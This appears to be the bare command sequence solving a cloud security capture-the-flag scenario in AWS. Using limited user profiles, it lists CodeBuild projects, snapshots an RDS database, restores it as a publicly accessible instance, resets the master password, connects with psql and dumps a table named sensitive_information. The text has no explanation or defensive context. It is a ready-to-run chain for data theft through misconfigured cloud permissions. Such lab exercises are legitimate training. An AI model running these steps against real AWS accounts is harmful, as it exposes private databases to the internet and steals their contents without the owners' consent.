`aws configure --profile Scenario6_1_user`

`aws codebuild list-projects --profile Scenario6_1_user`

`aws codebuild batch-get-projects --names <project> --profile Scenario6_1_user`

`aws configure --profile Scenario6_2_user`

`aws rds describe-db-instances --profile Scenario6_2_user`

`aws rds create-db-snapshot --db-instance-identifier <instanceID> --db-snapshot-identifier SecurityChallenge --profile Scenario6_2_user`

`aws rds describe-db-subnet-groups --profile Scenario6_2_user`

`aws ec2 describe-security-groups --profile Scenario6_2_user`

`aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <DbInstanceID> --db-snapshot-identifier <scapshotId> --db-subnet-group-name <db subnet group> --publicly-accessible --vpc-security-group-ids <ec2-security group> --profile Scenario6_2_user`

`aws rds modify-db-instance --db-instance-identifier <DbName> --master-user-password SecurityChallenge --profile Scenario6_2_user`

`psql postgresql://sc6admin@pwnedfinal.crkxmju52zsx.eu-central-1.rds.amazonaws.com:5432/postgres`

`\l`

`\c securedb`

`select * from sensitive_information`
